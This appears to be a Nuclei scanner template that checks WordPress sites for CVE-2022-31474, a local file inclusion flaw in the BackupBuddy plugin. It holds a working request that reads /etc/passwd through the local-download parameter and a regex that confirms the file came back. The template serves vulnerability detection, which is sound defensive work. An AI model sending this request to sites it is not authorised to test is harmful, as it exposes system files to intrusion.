id: CVE-2022-31474

info:
  name: LFI Vulnerability Check
  author: rix4uni
  severity: high
  description: Checks for Local File Inclusion vulnerabilities
  reference: https://twitter.com/shaybt12/status/1569794789175967745?t=24BFFOatJyuHIFOjY7Jh_g&s=09
  tags: lfi

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
          
      - type: status
        status:
          - 200